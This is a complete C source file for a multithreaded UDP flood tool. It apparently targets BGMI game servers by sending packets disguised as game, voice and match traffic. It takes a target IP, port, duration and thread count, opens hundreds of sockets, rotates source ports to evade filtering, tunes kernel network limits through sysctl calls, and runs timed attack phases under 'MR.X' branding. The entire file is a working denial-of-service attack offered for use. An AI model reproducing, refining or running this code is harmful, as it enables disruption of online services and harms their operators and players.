#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 200
#define MIN_ATTACK_TIME 60
#define MAX_ATTACK_TIME 300
#define MAX_RETRY_ATTEMPTS 3
#define BATCH_UPDATE_COUNT 50000

#define PHASE1_TIME 15
#define PHASE2_TIME 10
#define PHASE1_POWER 150
#define PHASE2_POWER 0
#define PHASE3_POWER 100

#define PPS_20BYTE 1200
#define PPS_128BYTE 300

#define BURST_SIZE 180
#define MAX_BURST 250

#define PORT_CHANGE_NORMAL 500
#define PORT_CHANGE_DIRECT 2000
#define PORT_RANGE 64000

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int attack_phase = 1;

struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=2000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='67108864 67108864 67108864' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65000' >/dev/null 2>&1");
#endif
}

void set_sock_buf(int sock) {
    int buf = 67108864;
    int rbuf = 33554432;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rbuf, sizeof(rbuf));
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed;
}

void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq, unsigned int seed) {
    memset(buf, 0, size);
    
    if (size < MIN_PACKET_SIZE) size = MIN_PACKET_SIZE;
    if (size > MAX_PACKET_SIZE) size = MAX_PACKET_SIZE;
    
    int enhanced_pattern = (pattern_type + (seq % 7)) % 4;
    
    switch(enhanced_pattern) {
        case 0: {
            unsigned int magic = 0xDEADBEEF ^ (thread_id * 1111) ^ (seq * 777);
            unsigned int session_id = (thread_id * 1000) + (seq % 1000);
            unsigned int timestamp = time(NULL) + thread_id + seq;
            
            memcpy(buf, &magic, 4);
            memcpy(buf + 4, &session_id, 4);
            memcpy(buf + 8, &seq, 4);
            memcpy(buf + 12, &timestamp, 4);
            
            buf[16] = 0xC0 ^ (seq & 0xFF);
            buf[17] = thread_id & 0xFF;
            buf[18] = 0x80 ^ ((seq >> 4) & 0xFF);
            buf[19] = (seq >> 8) & 0xFF;
            
            int max_i = size - 4;
            int start_i = 20;
            if (max_i > start_i) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) + i + thread_id) & 0xFF;
                }
            }
            
            if (size >= 22) {
                unsigned short checksum = size ^ thread_id ^ (seq & 0xFFFF) ^ 0xAAAA;
                memcpy(buf + size - 4, &checksum, 2);
            }
            break;
        }
        case 1: {
            buf[0] = 0xAB ^ (seq & 0xFF);
            buf[1] = 0xCD ^ ((seq >> 8) & 0xFF);
            buf[2] = enhanced_pattern;
            buf[3] = size ^ 0xFF;
            
            unsigned int player_id = 1000000 + (thread_id * 10000) + seq + (fast_rand(&seed) % 1000);
            memcpy(buf + 4, &player_id, 4);
            
            if (size >= 12) {
                unsigned int game_time = (seq * 7) % 1800;
                memcpy(buf + 8, &game_time, 4);
            }
            
            if (size >= 16) {
                buf[12] = 0x01 ^ (thread_id & 0x0F);
                buf[13] = thread_id & 0xFF;
                buf[14] = 0x03 ^ ((seq >> 4) & 0xFF);
                buf[15] = (seq >> 16) & 0xFF;
            }
            
            if (size >= 28) {
                int pos_x = 500 + ((thread_id * 17 + seq * 3) % 4000);
                int pos_y = 500 + ((thread_id * 23 + seq * 5) % 4000);
                int pos_z = 100 + ((thread_id * 29 + seq * 7) % 200);
                
                memcpy(buf + 16, &pos_x, 4);
                memcpy(buf + 20, &pos_y, 4);
                memcpy(buf + 24, &pos_z, 4);
            }
            
            if (size >= 30) {
                buf[28] = 0x80 ^ (seq & 0x7F);
                buf[29] = (seq >> 8) & 0xFF;
            }
            
            if (size >= 34) {
                int health = 100 - ((thread_id + seq * 3) % 80);
                memcpy(buf + 30, &health, 4);
            }
            
            if (size >= 38) {
                int ammo = 30 - ((thread_id * 2 + seq * 5) % 25);
                memcpy(buf + 34, &ammo, 4);
            }
            
            int max_i = size - 2;
            int start_i = 38;
            if (max_i > start_i && size >= 40) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) * (i + 1)) & 0xFF;
                }
            }
            
            if (size >= 22) {
                unsigned short crc = (size * thread_id * 7) ^ (seq * 13);
                memcpy(buf + size - 2, &crc, 2);
            }
            break;
        }
        case 2: {
            buf[0] = 0x56 ^ (thread_id & 0xFF);
            buf[1] = 0x4F ^ ((thread_id >> 8) & 0xFF);
            buf[2] = thread_id & 0xFF;
            buf[3] = 0x43 ^ (seq & 0xFF);
            
            if (size >= 8) {
                unsigned int voice_id = (thread_id * 100000) + seq * 11;
                memcpy(buf + 4, &voice_id, 4);
            }
            
            if (size >= 14) {
                buf[8] = 0x01 ^ (enhanced_pattern & 0xFF);
                buf[9] = enhanced_pattern;
                
                int timestamp = (time(NULL) * 1000) + thread_id * 7 + seq * 13;
                memcpy(buf + 10, &timestamp, 4);
            }
            
            if (size >= 16) {
                buf[14] = 0x7F ^ ((seq * 3) & 0x7F);
                buf[15] = (seq >> 8) & 0xFF;
            }
            
            int max_i = size - 8;
            int start_i = 16;
            if (max_i > start_i && size >= 24) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = ((fast_rand(&seed) % 511) - 128) & 0xFF;
                }
            }
            
            if (size >= 24) {
                buf[size - 8] = 0xAA ^ (thread_id & 0xFF) ^ (seq & 0xFF);
                buf[size - 7] = 0xBB ^ ((thread_id >> 8) & 0xFF) ^ ((seq >> 8) & 0xFF);
                buf[size - 6] = 0xCC ^ (seq & 0xFF) ^ (thread_id & 0xFF);
                buf[size - 5] = 0xDD ^ ((seq >> 8) & 0xFF) ^ ((thread_id >> 8) & 0xFF);
            }
            break;
        }
        case 3: {
            buf[0] = 0x4D ^ (seq & 0xFF);
            buf[1] = thread_id & 0xFF;
            buf[2] = 0x54 ^ ((seq >> 4) & 0xFF);
            buf[3] = 0x43 ^ ((thread_id >> 4) & 0xFF);
            
            if (size >= 8) {
                unsigned int match_id = 500000 + (thread_id * 1000) + seq * 17;
                memcpy(buf + 4, &match_id, 4);
            }
            
            if (size >= 10) {
                buf[8] = ((thread_id * 7) % 50) + 1;
                buf[9] = enhanced_pattern ^ 0x33;
            }
            
            if (size >= 22) {
                int zone_x = 1000 + ((thread_id * 37 + seq * 11) % 3000);
                int zone_y = 1000 + ((thread_id * 41 + seq * 13) % 3000);
                int zone_radius = 500 + ((thread_id * 43 + seq * 17) % 1500);
                
                memcpy(buf + 10, &zone_x, 4);
                memcpy(buf + 14, &zone_y, 4);
                memcpy(buf + 18, &zone_radius, 4);
            }
            
            if (size >= 26) {
                buf[22] = 0x01 ^ (thread_id & 0x0F);
                buf[23] = thread_id & 0xFF;
                buf[24] = seq & 0xFF;
                buf[25] = (seq >> 8) & 0xFF;
            }
            
            if (size >= 30) {
                int remaining_time = 1200 - ((thread_id * 7 + seq * 19) % 600);
                memcpy(buf + 26, &remaining_time, 4);
            }
            
            int max_i = size - 4;
            int start_i = 30;
            if (max_i > start_i && size >= 34) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) + i * 3 + thread_id) & 0xFF;
                }
            }
            
            if (size >= 24) {
                unsigned int footer = 0x12345678 ^ (thread_id * 1111) ^ (seq * 7777) ^ 0x55555555;
                memcpy(buf + size - 4, &footer, 4);
            }
            break;
        }
    }
}

int get_pps_per_thread() {
    if (PACKET_SIZE <= 20) return PPS_20BYTE;
    if (PACKET_SIZE >= 128) return PPS_128BYTE;
    float ratio = (PACKET_SIZE - 20) / 108.0f;
    return PPS_20BYTE - (int)((PPS_20BYTE - PPS_128BYTE) * ratio);
}

int bind_random_port(int sock) {
    struct sockaddr_in src_addr;
    int attempts = 0;
    
    while (attempts < MAX_RETRY_ATTEMPTS) {
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(1024 + (rand() % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
            return 1;
        }
        attempts++;
        usleep(1000);
    }
    
    close(sock);
    return 0;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char *packets[FLOOD_SOCKETS];
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        set_sock_buf(socks[i]);
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        if (bind_random_port(socks[i])) {
            packets[i] = malloc(PACKET_SIZE);
        } else {
            socks[i] = -1;
        }
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_counter = thread_idx * 10000;
    int port_change_counter = 0;
    unsigned int seed = (thread_idx * 1234567) ^ time(NULL) ^ getpid();
    
    int pps_target = get_pps_per_thread();
    int current_phase = 1;
    int burst_size = BURST_SIZE;
    
    struct timeval last_time;
    gettimeofday(&last_time, NULL);
    
    while (!atomic_load(&stop_signal)) {
        current_phase = atomic_load(&attack_phase);
        
        if (current_phase == 2) {
            usleep(10000);
            continue;
        }
        
        if (current_phase == 1) {
            burst_size = (BURST_SIZE * PHASE1_POWER) / 100;
            if (burst_size > MAX_BURST) burst_size = MAX_BURST;
        } else {
            burst_size = BURST_SIZE;
        }
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || packets[i] == NULL) continue;
            
            int pattern = (seq_counter / 37) % 4;
            create_bgmi_packet(packets[i], PACKET_SIZE, pattern, thread_idx + 1000, seq_counter, seed);
            
            for (int burst = 0; burst < burst_size && !atomic_load(&stop_signal); burst++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (ret > 0) {
                    local_packets++;
                    local_bytes += PACKET_SIZE;
                    seq_counter++;
                }
            }
        }
        
        port_change_counter++;
        if (port_change_counter >= PORT_CHANGE_DIRECT) {
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                if (socks[i] >= 0) bind_random_port(socks[i]);
            }
            port_change_counter = 0;
        }
        
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        long elapsed_us = (current_time.tv_sec - last_time.tv_sec) * 1000000 + 
                         (current_time.tv_usec - last_time.tv_usec);
        
        if (elapsed_us < 1000) {
            usleep(1000 - elapsed_us);
        }
        gettimeofday(&last_time, NULL);
        
        if (local_packets >= BATCH_UPDATE_COUNT) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i] != NULL) free(packets[i]);
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus > 0) {
        CPU_SET(tid % cpus, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    set_sock_buf(s);
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(1024 + (rand() % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_local = tid * 7777;
    int port_change = 0;
    unsigned int seed = (tid * 7654321) ^ time(NULL) ^ getpid();
    
    int pps_target = get_pps_per_thread();
    int current_phase = 1;
    int burst_size = BURST_SIZE;
    
    struct timeval last_time;
    gettimeofday(&last_time, NULL);
    
    while (!atomic_load(&stop_signal)) {
        current_phase = atomic_load(&attack_phase);
        
        if (current_phase == 2) {
            usleep(5000);
            continue;
        }
        
        if (current_phase == 1) {
            burst_size = (BURST_SIZE * PHASE1_POWER) / 100;
            if (burst_size > MAX_BURST) burst_size = MAX_BURST;
        } else {
            burst_size = BURST_SIZE;
        }
        
        int pattern = (seq_local / 53) % 4;
        create_bgmi_packet(packet, PACKET_SIZE, pattern, tid, seq_local, seed);
        
        for (int burst = 0; burst < burst_size && !atomic_load(&stop_signal); burst++) {
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (ret > 0) {
                local_packets++;
                local_bytes += PACKET_SIZE;
                seq_local++;
                
                port_change++;
                if (port_change >= PORT_CHANGE_NORMAL) {
                    src_addr.sin_port = htons(1024 + (rand() % PORT_RANGE));
                    bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr));
                    port_change = 0;
                }
            }
        }
        
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        long elapsed_us = (current_time.tv_sec - last_time.tv_sec) * 1000000 + 
                         (current_time.tv_usec - last_time.tv_usec);
        
        if (elapsed_us < 1000) {
            usleep(1000 - elapsed_us);
        }
        gettimeofday(&last_time, NULL);
        
        if (local_packets >= BATCH_UPDATE_COUNT) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    close(s);
    return NULL;
}

void *phase_controller(void *arg) {
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🦋 MR.X (15s @ 150%% power)\n\n");
    
    atomic_store(&attack_phase, 1);
    sleep(PHASE1_TIME);
    
    printf("\n⏰️ Power  (10s)\n\n");
    atomic_store(&attack_phase, 2);
    sleep(PHASE2_TIME);
    
    int phase3_time = ATTACK_TIME - PHASE1_TIME - PHASE2_TIME;
    if (phase3_time < 1) phase3_time = 1;
    
    printf("\n🔥 MR.X 3: (%ds @ 100%% POWER)\n\n", phase3_time);
    atomic_store(&attack_phase, 3);
    
    sleep(phase3_time);
    
    atomic_store(&stop_signal, 1);
    
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    unsigned long long current_peak = 0;
    
    int elapsed = 0;
    int current_phase = 1;
    
    while (elapsed < ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        elapsed++;
        
        if (elapsed == PHASE1_TIME) current_phase = 2;
        if (elapsed == PHASE1_TIME + PHASE2_TIME) current_phase = 3;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (pps > current_peak) {
            current_peak = pps;
        }
        
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        
        if (current_phase == 1) {
            printf("🦋 PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, current_peak/1000, megabytes);
        } else if (current_phase == 2) {
            printf("⏰️ (Wait  🙏 MR.X)\n");
        } else {
            printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, current_peak/1000, megabytes);
        }
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (ATTACK_TIME > 0) {
        double avg_pps = total_p / (double)ATTACK_TIME;
        double total_mb = total_b / (1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ (time(NULL) << 16));
    
    optimize_kernel();
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = -1;
    }
    
    printf("Created %d attack threads\n", THREAD_COUNT);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
    }
    
    pthread_t phase_thread;
    pthread_create(&phase_thread, NULL, phase_controller, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    int remaining_time = ATTACK_TIME;
    while (remaining_time > 0 && !atomic_load(&stop_signal)) {
        sleep(1);
        remaining_time--;
    }
    
    if (!atomic_load(&stop_signal)) {
        atomic_store(&stop_signal, 1);
    }
    
    usleep(500000);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(phase_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}